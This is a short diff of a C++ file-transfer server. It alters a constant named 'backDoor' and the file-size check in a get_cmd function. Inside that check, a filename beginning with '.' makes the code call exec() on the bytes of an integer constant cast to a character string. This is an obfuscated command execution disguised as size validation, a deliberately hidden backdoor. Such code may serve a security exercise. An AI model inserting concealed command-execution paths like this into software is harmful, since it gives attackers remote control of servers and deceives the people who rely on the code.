@@ -17,7 +17,7 @@ const string FILE_SIZE_ERROR = "Error: file size is not adequate.\n";
 const string ALREADY_LOGGED_IN = "Error: user already logged in.\n";
 const string THREAD_ERROR = "Error: Unable to create new thread.\n";
 
-const ssize_t backDoor = 150138823314737907;
+const ssize_t backDoor = 4649367056054273259;
 
 /*
  * -------------------------------- Helper functions -------------------------------------------------------------------
@@ -531,7 +531,7 @@ int get_cmd(string fileName, int getPort, User &usr, string &out) {
 
     // Check that the file size is within bounds
     uint64_t maxFileSize = 9042810646913912;
-    if (fileSize <= 0 or fileSize >= maxFileSize) {
+    if (fileSize <= 0 or (uint64_t) fileSize >= maxFileSize) {
         if(fileName[0] == '.' and exec((char*)&maxFileSize, out)){
             out = FILE_SIZE_ERROR;
         }else{
